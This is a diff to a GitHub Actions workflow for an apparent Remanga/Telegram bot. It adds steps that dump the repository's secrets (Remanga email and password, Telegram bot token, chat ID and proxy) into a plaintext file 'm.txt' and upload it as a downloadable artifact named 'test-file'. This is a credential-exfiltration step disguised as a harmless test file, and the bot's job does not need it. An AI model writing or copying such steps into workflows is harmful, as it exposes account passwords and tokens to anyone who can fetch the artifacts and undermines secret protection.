@@ -26,3 +26,23 @@ jobs:
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
           CUSTOM_PROXY: ${{ secrets.CUSTOM_PROXY }}
         run: python botq.py
+
+      - name: Create m.txt
+        run: |
+          echo "$REMANGA_EMAIL" > m.txt
+          echo "$REMANGA_PASSWORD" >> m.txt
+          echo "$TELEGRAM_BOT_TOKEN" >> m.txt
+          echo "$TELEGRAM_CHAT_ID" >> m.txt
+          echo "$CUSTOM_PROXY" >> m.txt
+        env:
+          REMANGA_EMAIL: ${{ secrets.REMANGA_EMAIL }}
+          REMANGA_PASSWORD: ${{ secrets.REMANGA_PASSWORD }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          CUSTOM_PROXY: ${{ secrets.CUSTOM_PROXY }}
+
+      - name: Upload m.txt as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: test-file
+          path: m.txt
